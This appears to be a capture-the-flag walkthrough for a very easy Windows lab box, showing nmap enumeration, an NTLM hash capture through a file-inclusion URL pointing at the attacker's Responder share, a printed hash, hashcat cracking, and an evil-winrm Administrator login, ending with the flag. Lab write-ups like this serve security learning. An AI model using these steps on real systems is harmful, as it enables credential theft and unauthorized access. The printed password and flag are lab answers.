System: Windows
Difficulty: Very Easy

IP Address: 10.129.152.42
# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.152.42 -sC -sV
```

```
<SNIP>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
```

Additional ports are also enumerated.
```
kali@kali:~$ sudo nmap 10.129.152.42 -p- -v
```

2 other ports have been also enumerated.
```
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub
```

After visiting the website data in the browser, it returns nothing with a link `http://unika.htb`. Add this line into the `/etc/hosts` file.
```
10.129.152.42	unika.htb
```

After examining the webpage, it is possible to see that there is a `page` parameter to change language. It is highly possible to be exploitable if there are no validation mechanisms.

Setup Responder according to the box name, to listen on the system.
```
sudo responder -I tun0 -v
```

Enter this in the Browser URL Bar.
```
http://unika.htb/index.php?page=\\10.10.14.154\share
```

A hash has been successfully returned from responder. It will be recorded into `hash.txt`
```
Administrator::RESPONDER:bfb59d4b88b32ac7:D5C29536C94E9B7F1A0B53963B22296B:0101000000000000809CF8969269DD014ECDAA1EB686106E000000000200080034004C003200470001001E00570049004E002D00530030005A004200490038005A004A0050005700510004003400570049004E002D00530030005A004200490038005A004A005000570051002E0034004C00320047002E004C004F00430041004C000300140034004C00320047002E004C004F00430041004C000500140034004C00320047002E004C004F00430041004C0007000800809CF8969269DD0106000400020000000800300030000000000000000100000000200000626DFADC1A8E0E35BC116DA341E30441EAAC561D04D6EE999C8736F69F91D9120A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350034000000000000000000
```

This hash will be cracked using this command.
```
hashcat -m 5600 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

The password is `badminton`.

Since the port 5985 WinRM is available, login is attempted through those credentials.
```
kali@kali:~$ evil-winrm -i 10.129.152.42 -u Administrator -p badminton
```

The connection is successful. The flag is in `C:/Users/mike/Desktop`.
```
ea81b7afddd03efaa0945333ed147fac
```